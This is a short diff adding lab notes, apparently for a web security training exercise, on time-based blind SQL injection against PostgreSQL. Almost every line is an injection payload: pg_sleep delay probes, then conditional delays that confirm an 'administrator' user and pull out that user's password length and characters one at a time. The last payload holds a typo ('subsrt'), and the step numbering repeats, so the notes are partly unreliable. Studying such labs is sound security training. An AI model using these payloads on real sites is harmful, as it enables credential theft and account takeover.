@@ -1,0 +1,15 @@
+Blind SQL injection with time delays and information retrieval
+
+Analysis
+
+1. check if vulnerable to blind sql injection : '||pg_sleep(10)--
+            '||(select pg_sleep(10))--
+2. get cookies
+2. check the if else statement (1=1): 
+            '||(select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+3. check for username in users table
+            '||(select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+4. check for password length
+            '||(select case when (username='administrator' and length(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+4. check for characters of the password
+            '||(select case when (username='administrator' and subsrt(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
